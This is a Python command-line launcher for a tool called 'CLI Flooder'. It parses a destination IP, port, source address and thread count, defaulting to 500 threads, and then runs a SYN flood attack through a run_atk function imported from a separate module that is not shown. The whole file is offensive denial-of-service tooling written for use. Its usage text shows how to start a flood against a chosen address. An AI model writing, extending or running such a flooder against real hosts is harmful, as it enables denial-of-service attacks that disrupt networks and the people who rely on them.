import os
import sys

import click
from pyfiglet import Figlet

from constants import SYN_TYPE

from syn_flood import run_atk, usage_body


def syn_usage_header():
    print("SYN FLOOD attack option")
    print("")
    print("Usage: ./main.py run -atk syn")


def syn_usage_example():
    print("Example: main.py run -atk syn -d 127.0.0.1 -p 4 -s 127.0.0.1 -t 50")


def syn_usage():
    syn_usage_header()
    usage_body()
    syn_usage_example()


def syn(destination_ip, port, source_ip, num_thread):
    """
    Runs the SYN attack
    """
    if destination_ip is None or port is None or source_ip is None or num_thread is None:  # Wrong usage
        syn_usage()
        return -1

    run_atk(destination_ip, port, source_ip, num_thread)


@click.group()
def main():
    pass


@main.command(help='Command to specify which attack to perform.')
@click.option('--attack', '-atk', required=True, nargs=1, help='Type of the Flooder attack to be performed.')
@click.option('-d', '--destination', help='Destination IP Address')
@click.option('-p', '--port', type=int, help='Destination Port')
@click.option('-s', '--source', help='Source address to send from')
@click.option('-t', '--threads', default=500, help='Number of threads to use')
def run(attack=None, destination=None, port=None, source=None, threads=500):
    if str.lower(attack) == SYN_TYPE:
        syn(destination, port, source, threads)  # Run SYN method

    else:  # Not implemented attack
        print("Option not implemented. Introduced value = {}".format(attack))

    return 0


f = Figlet(font='slant')  # Useless cool text
print(f.renderText('CLI Flooder'))

main()  # Runs the cli
